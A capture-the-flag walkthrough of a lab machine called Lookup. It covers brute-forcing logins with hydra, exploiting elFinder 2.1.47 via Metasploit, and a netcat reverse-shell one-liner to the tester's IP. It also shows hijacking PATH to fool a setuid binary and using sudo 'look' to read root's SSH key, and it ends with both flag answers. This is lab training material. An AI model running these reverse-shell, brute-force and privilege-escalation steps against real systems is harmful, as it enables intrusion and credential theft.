# Lookup
(flags are at the end of the writeup)

### Lookup
Initial scan shows port 22 and 80 open: 

    # Nmap 7.94SVN scan initiated Wed Nov 27 17:24:12 2024 as: /usr/lib/nmap/nmap --privileged -p22,80 -sC -sV -oN scan 10.10.65.102
    Nmap scan report for lookup.thm (10.10.65.102)
    Host is up (0.061s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
    |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
    |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Login Page
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

If I try to access the webpage, I get redirected to `lookup.thm`:<br />
![image](https://github.com/user-attachments/assets/084acc68-fc20-4967-b497-99d031da7a78)<br />
So add the following line `10.10.65.102 lookup.thm` to the `/etc/hosts` file. It seems like a basic login page. If I try to access with basic credentials such as `admin:password`, I get the following response:<br />
![image](https://github.com/user-attachments/assets/c71eabe3-d2be-4cca-8991-91672308e8a7)<br />
Which is a weird way of handling errors. I tried `sqlmap` but nothig. I have to dig somewhere else.<br />
Next thing I try is to enumerate directories using gobuster: `gobuster dir -u lookup.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt` but nothing was found. <br />
Now I try to enumerate subdomains. I found the subdomain `www.lookup.thm` but it's the same as `lookup.thm` so nothing there. Next, I noticed that if I tried looking with user `admin`, I get the reponse "Wrong password". But if I try to log in with, for example, "john", I get "Wrong username or password." This means that admin should be a valid user. So I try to login into the admin's account using bruteforce with hdyra: `hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"` and it finds something!<br />
![image](https://github.com/user-attachments/assets/d3a9e3c4-b445-4844-bbc6-d38ed1491c6b)<br />
Login fails.. but something strange happens, look:<br />
![image](https://github.com/user-attachments/assets/cec66cdd-cebc-4e4f-8685-5639592ea325)<br />
If I use credentials `admin:password123`, the server responds with "Wrong username or password", which is incoherent with the fact that admin is a valid user. This is really strange and I'm not sure why it behaves like that. But my guess is that it might do this for some server misconfiguration which shows this message if the password is a valid password! So the server might have this weird behaviour:

    1) if username and password are correct --> successful login
    2) if username is incorrect --> wrong username or password
    3) if username is correct but password doesn't exist on the DB --> wrong password
    4) if username is correct and password exists on the DB, but they don't match --> wrong username or password

I know, it's strange, but I don't have any other explanation for that. So since `password123` might be valid, let's try a password spraying attack! I'll bruteforce usernames using this password with hydra: <br />
![image](https://github.com/user-attachments/assets/b9781d2c-324f-47ca-b71d-aee99e19416c)<br />
I found a valid set of credentials! `jose:password123`. If I try to log in, I get redirected to `files.lookup.thm`, so let's add it on the /etc/hosts file.<br />
![image](https://github.com/user-attachments/assets/ff5d452a-3f5b-4b33-b7c2-994bad37727b)<br />
ElFinder is an opensource file management software that wants to offer a desktop-like experience. The version is `2.1.47`. Searching online, I found that this version is vulnerable to command injection, and the exploit is available on metasploit! So open `msfconsole` and run the exploit with the following commands:

    use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
    set lhost YOUR_IP
    set rhosts files.lookup.thm
    run

And it should open a meterpreter session. Now, I can't use metasploit, so I used the `shell` command to drop to a system shell, and then opened a reverse shell on another terminal because I really don't know how to use meterpreter very well, I need to do a tutorial. For the reverse shell I opened a netcat listener on my machine and then used then from the dropped shell I run `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.90.188 5555 >/tmp/f`.
First thing I notice: the user `think` has the user flag, and inside his home directory I see a `.passwords` file that I can't read. So my guess is that I need to find a way to read that file. <br />
Using linpeas on the target system, I found an interesting binary that might be exploited:<br />
![image](https://github.com/user-attachments/assets/883cfbee-381e-4cee-953c-747b15f65b58)<br />
This is how it behaves: <br />
![image](https://github.com/user-attachments/assets/5122c223-5870-418f-bfa3-8e5f482aa70d)<br />
So it runs the `id` command to find out the user, and then looks for `/home/%user%/.passwords`. I think that my goal is to somehow fool this binary into believing that I'm actually the user `think`.<br /><br />
I decided to analyze this binary using IDA. Here's the main structure: <br />
![image](https://github.com/user-attachments/assets/20a4cbee-8f1d-47d6-882d-74d6eac5f44a)<br />
I'm used to work with the CDECL or STDCALL calling conventions from university, because we only analyzed 32 bit windows executables. This is the first time I'm trying to analyze an ELF file, but it seems very similar. The main diffence I need to know is that the arguments of functions are not pushed on the stack, but are stored on registers. Specifically `rdi`, `rsi`, `rdx` and `rcx`.<br /><br />
From this first block we can see that the binary is calling `popen` with `id` as parameter, so it wants to execute the `id` system command. <br />
This is another interesting block: <br />
![image](https://github.com/user-attachments/assets/7657b367-a033-4068-bd89-6c77f12c19f8)<br />
The binary takes the stdoutput of the `id` command, and then ignores the user-ID (the integer) and only considers the username. Here "uid=%u(%[^)])" is a paramenter of `fscanf` which specifies to ignore the UID, and only take the string that is inside the first two parenthesis. For example, if I now run `id`:<br />
![image](https://github.com/user-attachments/assets/913cb855-f12b-4eb4-aa56-401d2b9031e9)<br />
This binary will only consider the string underlined in red, which is `www-data`.<br />
At this point it tries to read the .passwords file, just like I guessed earlier:<br />
![image](https://github.com/user-attachments/assets/c9b61b17-9bc3-4016-a479-07e23c67c7b0)<br />
So I think I know where the vunlnerability lies. The binary is calling the `id` command, but not `/usr/bin/id` or whatever; the path is relative, not absolute. This means that I can create a custom `id` command on any directory, for example /tmp/, and then change the `PATH` environment variable to search for binaries inside /tmp/ first. So let's try it. I created the custom `id` command inside /tmp/, and it prints echos a string on stdoutput, built to fool the `pwm` binary that I'm actually the user `think`. The code can be found in this folder in the file `fake_id`. Remember to call it `id` and to make it executable with `chmod +x id`. Now we want to change the PATH environment variable: run `export PATH=/tmp:$PATH`. Now if I run `id`:<br />
![image](https://github.com/user-attachments/assets/6cbecb52-7293-410e-8376-a33ac0de5a40)<br />
It executes my `fake_id`. The setup is ready, let's run the vulnerable binary: <br/ >
![image](https://github.com/user-attachments/assets/1c753f57-ae4f-4d84-a83c-e1c1700bf7ba)<br />
It worked! We have a list of passwords! I will now copy this wordlists in a file, and then will use it to bruteforce an ssh login as the user `think`. The command is `hydra -l think -P passwords ssh://10.10.124.210`. And the credentials are `think:josemario.AKA(think)`.<br />
Time to become root. If I run `sudo -l` and prompt the password, I can see that I have sudo privileges on the following binary: <br />
![image](https://github.com/user-attachments/assets/ef14348a-3b6d-4978-b727-99cbcc82607f)<br />
I didn't know this binary. But apparently is a well known binary that will show you all the words (taken from a dictionary in the file system) that start with the input that you provide. I found on [GTFObins](https://gtfobins.github.io/gtfobins/look/#sudo) a way to exploit it to read any files we want, so I used it to read the root flag: <br />
![image](https://github.com/user-attachments/assets/1a95beda-001c-4c3f-9497-8a209979f0ad)<br />
If I wanted to used it to become root, one possible way is to read the private rsa key with `sudo /usr/bin/look '' /root/.ssh/id_rsa`, and then use it to login with ssh. Have a nice rest of your day :)

- What is the user flag? `38375fb4dd8baa2b2039ac03d92b820e`
- What is the root flag? `5a285a9f257e45c68bb6c9f9f57d18e8`
